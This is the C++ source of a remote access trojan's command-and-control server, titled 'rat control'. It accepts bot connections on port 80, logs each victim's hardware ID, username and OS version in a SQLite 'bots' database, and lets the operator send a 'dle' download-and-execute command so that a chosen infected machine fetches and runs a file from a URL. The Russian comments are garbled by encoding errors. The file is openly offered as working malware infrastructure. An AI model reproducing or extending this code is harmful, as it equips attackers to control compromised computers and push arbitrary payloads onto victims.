#include "winsock.h"
#include "sqlite3.h"
#include "stdio.h"
#include <string>
#include <iostream>
#include "shlwapi.h"

using namespace std;

#pragma comment(lib, "ws2_32")
#pragma comment(lib, "shlwapi")
#pragma comment(lib, "iphlpapi")
#pragma warning(disable : 4996)

sqlite3* db;

struct CLIENTS
{
	SOCKET SOCKET;
	char USERNAME[100];
	char OSVER[100];
	char HWID[100];
};

struct DLE
{
	char URL[1000];
};

CLIENTS SOCKETS[10000];

int count_clients;

struct CMDiDATA
{
	DWORD CMD;
	char DATA[1000];
};

BOOL sendint(SOCKET con, int i)
{
	if (sizeof(int) == send(con, (char*)&i, sizeof(int), NULL))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL RecvStat(SOCKET Con)
{
	return sendint(Con, 0);
}

DWORD WINAPI isOnline(LPVOID param)
{
	while (TRUE)
	{
		sqlite3_stmt* stmt;
		if (sqlite3_prepare_v2(db, "SELECT NOMER FROM BOT WHERE OTVET='1'", -1, &stmt, 0) == SQLITE_OK)
		{
			while (sqlite3_step(stmt) == SQLITE_ROW)
			{
				DWORD NOMER = sqlite3_column_int(stmt, 0);
				if (RecvStat(SOCKETS[NOMER].SOCKET) == FALSE)
				{
					char* ErrMsg = NULL;
					char* zapros = new char[1000];
					wsprintfA(zapros, "UPDATE BOT SET OTVET='0' WHERE NOMER='%d'", NOMER);
					if (SQLITE_OK == sqlite3_exec(db, zapros, nullptr, nullptr, &ErrMsg))
					{
						closesocket(SOCKETS[NOMER].SOCKET);
						if (count_clients > 0)
						{
							count_clients--;
						}
					} 
					delete[] zapros;
				}
			}
			sqlite3_finalize(stmt);
		}
		Sleep(10000);
	}
}

void PrintOnlineClients()
{
	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT NOMER, HWID, USERNAME, OSVER FROM BOT WHERE OTVET='1'", -1, &stmt, 0) == SQLITE_OK)
	{
		while (sqlite3_step(stmt) == SQLITE_ROW)
		{
			DWORD NOMER = sqlite3_column_int(stmt, 0);
			char *HWID = (char *)sqlite3_column_text(stmt, 1);
			char *USERNAME = (char *)sqlite3_column_text(stmt, 2);
			char *OSVER = (char *)sqlite3_column_text(stmt, 3);
			printf("\n\t|NUM: %d|HWID: %s|USERNAME: %s|OSVER: %s|\n", NOMER, HWID, USERNAME, OSVER);
		}
	}
}

DWORD WINAPI Title(LPVOID param)
{
	while (TRUE)
	{
		char* cur_clients_mem = new char[100];
		wsprintfA(cur_clients_mem, " :: rat control :: clients online [%d] :: ", count_clients);
		SetConsoleTitleA(cur_clients_mem);
		delete[] cur_clients_mem;
		Sleep(1000);
	}
}

DWORD WINAPI ConsoleReader(LPVOID param)
{
	while (TRUE)
	{
		string line = { 0 }; //�������������� ����� ������
		getline(cin, line); //��������� ������� � ���� ����� �� �������
		char* mycmd = strdup(line.c_str()); //������������ ��� ������ � ����, ������� ����� �_str

		if ((mycmd[0] == 'm' && mycmd[1] == 'a' && mycmd[2] == 'n')) // ���� ���� ������� ����� 'man'
		{
			//��� ����� ���������� ������� ������� ����� ������ � �������

		}
		else if ((mycmd[0] == 'c' && mycmd[1] == 'm' && mycmd[2] == 'd')) // ���� ���� ������� ����� 'cmd'
		{
			//��� �� ������� ����� ������ ������� � �������� �� �������
			if (mycmd[3] == ':') // ���� �������� ������ ���������
			{
				int NOMER = 0; //������� ����� ������� ���������� ����� ����� ����

				char NUMCHAR[sizeof(int)]; //������� ������ ����� �� ������� �����
				memset(NUMCHAR, 0, sizeof(NUMCHAR)); //������� ���
				
				//������� ���� � ������� ����� ���������� ������� � �������, ���� �� ��������� �� ���������,
				//���� ������ �� ����� ��������� �� ����� ������� � NUMCHAR
				int i, j; 
				for (i = 4, j = 0; ; i++, j++)
				{
					if (mycmd[i] == ':')
					{
						break;
					}
					NUMCHAR[j] = mycmd[i];
				}
				//������������ NUMCHAR � ����� NOMER
				NOMER = atoi(NUMCHAR);
				
				//� ������ �������� ������� ������� ������:) ���������� �� � �� �����
				if ((mycmd[i + 1] == 'd' && mycmd[i + 2] == 'l' && mycmd[i + 3] == 'e')) //download and execute - ������� � ���������
				{
					if (mycmd[i + 4] == ':') //���� ����� ������ ����� ���������
					{
						//�� �������� ������� � ���� url ��� ��� �� �������
						char url[1000]; 
						memset(url, 0, sizeof(url));
						int x, y;
						for (x = i + 5, y = 0; ; x++, y++)
						{
							if (mycmd[x] == 0) //���� ������ �� ����������
							{
								break;
							}
							url[y] = mycmd[x];
						}
						if (url[0] != 0) //���� ������ ������ ������� ����� url �� ����� ����
						{
							printf("\n\t zagruzka u vupolnenie url: %s...; NOMER: %d", url, NOMER);
							CMDiDATA indata; //������� ��������� ���������� �� ��������
							DLE dlecmd; //�������������� ��������� ������� ����� �������� �� �������� URL
							//�� ���� �� ����� �� ������ ����������� ��� � indata.DATA, �� � ��� �������
							//������� ������� ������ ���������������� ���������, ��� ��� ����� ����� ��� 
							memset(&indata, 0, sizeof(CMDiDATA)); //��������
							memset(&dlecmd, 0, sizeof(DLE)); //��������
							memcpy(dlecmd.URL, url, sizeof(url)); //��������� url � ��������� DLE
							indata.CMD = 1; //�������� ����� ������� ��� �������� �����
							memcpy(indata.DATA, dlecmd.URL, sizeof(dlecmd.URL)); //��������� DLE � indata.DATA
							send(SOCKETS[NOMER].SOCKET, (char*)&indata, sizeof(CMDiDATA), 0); //���������� ������������ ��������� �� ������ �� ������ NOMER � ������� SOCKETS
						}
					}
				}
			}
		}
		else if ((mycmd[0] == 'o' && mycmd[1] == 'n' && mycmd[2] == 'l'))
		{
			//�������� ���� �������� ������
			PrintOnlineClients(); 
		}
		else if ((mycmd[0] == 'c' && mycmd[1] == 'l' && mycmd[2] == 's'))
		{
			//������� �������
			system("cls"); 
		}
	}
}

int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	AllocConsole();

	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);

	count_clients = 0;

	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	WSAStartup(DLLVersion, &wsaData);

	SOCKET sListen;
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = htons(80);
	int sizeofaddr = sizeof(addr);
	sListen = socket(AF_INET, SOCK_STREAM, NULL);
	bind(sListen, (SOCKADDR*)&addr, sizeofaddr);
	listen(sListen, SOMAXCONN);
	
	int rc;
	rc = sqlite3_open("bots.db", &db);
	
	if (!rc)
	{
		CreateThread(NULL, 0, Title, NULL, 0, 0); //�������� ������� ������ ���-�� �������� � ��������� �������
		CreateThread(NULL, 0, isOnline, NULL, 0, 0); //�������� ������� �������� �� ������ ����� ��������
		CreateThread(NULL, 0, ConsoleReader, NULL, 0, 0); //�������� ������� ���������� �� ������� ������ �����

		for (;;) //���� ������ �������� - �� ����� ������� ���������� accept
		{
			sockaddr_in addr; //� ������ ��� ������� ���
							  //��� ����������� ������ ������� ������ ��� ���� ������� accept ����� �����������
							  //� ����� ������ ����� ���������������� ��� ������� newConn
			SOCKET newConn = accept(sListen, (sockaddr*)&addr, &sizeofaddr);
			{
				CMDiDATA indata; //������� ��������� ���������� �� ��������
				CLIENTS client; //������� ��������� ���������� �� ���� � �������
				memset(&indata, 0, sizeof(CMDiDATA)); //�������� 
				memset(&client, 0, sizeof(CLIENTS)); //��������
				recv(newConn, (char*)&indata, sizeof(CMDiDATA), 0); //����� ��������� �� �������

				if (indata.CMD == 0) //���� CMD = 0, �� ��� ��������
				{
					memcpy(&client, indata.DATA, sizeof(CLIENTS)); //�������� DATA � ��������� client

					char* zapros_1 = new char[1000];
					wsprintfA(zapros_1, "SELECT NOMER FROM BOT WHERE HWID='%s' AND USERNAME='%s' AND OSVER='%s'", client.HWID, client.USERNAME, client.OSVER);

					sqlite3_stmt* stmt_1;
					// ��� �� ���� �� �����, ����� �����, � ������ �� ������ � ���� ������
					if (sqlite3_prepare_v2(db, zapros_1, -1, &stmt_1, 0) == SQLITE_OK)
					{
						if (sqlite3_step(stmt_1) == SQLITE_ROW)
						{
							int NOMER = 0;
							//���� ������ ���� - �� ����������� ��������� ���:
							NOMER = sqlite3_column_int(stmt_1, 0);
							char* zapros_2 = new char[1000];
							wsprintfA(zapros_2, "UPDATE BOT SET OTVET='1' WHERE HWID='%s' AND USERNAME='%s' AND OSVER='%s'", client.HWID, client.USERNAME, client.OSVER);
							char* ErrMsg = NULL;
							//��� �� ��������� ������ � ���� ������ ����� ���� ����� = 1, ��������� ��� ������ ������ ������
							if (SQLITE_OK == sqlite3_exec(db, zapros_2, nullptr, nullptr, &ErrMsg))
							{
								SOCKETS[NOMER].SOCKET = newConn;
								memcpy(SOCKETS[NOMER].HWID, client.HWID, sizeof(client.HWID));
								memcpy(SOCKETS[NOMER].USERNAME, client.USERNAME, sizeof(client.USERNAME));
								memcpy(SOCKETS[NOMER].OSVER, client.OSVER, sizeof(client.OSVER));
								//��� ����� ���� ������ � ��� ��� ������ ������ ������
								count_clients++;
							}
							else
							{
								printf("Error Add Old Client %s", ErrMsg);
							}
							//������ ������
							delete[] zapros_2;
						}
						else //���� ������ �� ������ �� ����� ����� ������������ ����� ������ �� ��
						{
							sqlite3_stmt* stmt_3;
							if (sqlite3_prepare_v2(db, "SELECT NOMER FROM BOT ORDER BY NOMER DESC LIMIT 1", -1, &stmt_3, 0) == SQLITE_OK && sqlite3_step(stmt_3) == SQLITE_ROW)
							{
								int NEWNOMER = sqlite3_column_int(stmt_3, 0) + 1; // � ������� ��������
								NEWNOMER++;
								char* zapros_3 = new char[1000];
								wsprintfA(zapros_3, \
									"INSERT INTO BOT (NOMER, HWID, USERNAME, OSVER, OTVET) VALUES ('%d', '%s', '%s', '%s', 1)", \
									NEWNOMER, client.HWID, client.USERNAME, client.OSVER);
								char* ErrMsg = NULL;
								if (SQLITE_OK == sqlite3_exec(db, zapros_3, nullptr, nullptr, &ErrMsg))
								{
									SOCKETS[NEWNOMER].SOCKET = newConn;
									memcpy(SOCKETS[NEWNOMER].HWID, client.HWID, sizeof(client.HWID));
									memcpy(SOCKETS[NEWNOMER].USERNAME, client.USERNAME, sizeof(client.USERNAME));
									memcpy(SOCKETS[NEWNOMER].OSVER, client.OSVER, sizeof(client.OSVER));
									//������ ��� ����� ���� � ��� ��� ����� ������ ������
									count_clients++;
								}
								else
								{
									printf("Error Add New Client %s", ErrMsg);
								}
								sqlite3_finalize(stmt_3);
								//������ ������
								delete[] zapros_3;
							}
						}
					}
					sqlite3_finalize(stmt_1);
					//������ ������
					delete[] zapros_1;
				}
			}
		}
	} 
	else {
		printf("Can't open database: %s\n", sqlite3_errmsg(db));
		system("pause");
	}
}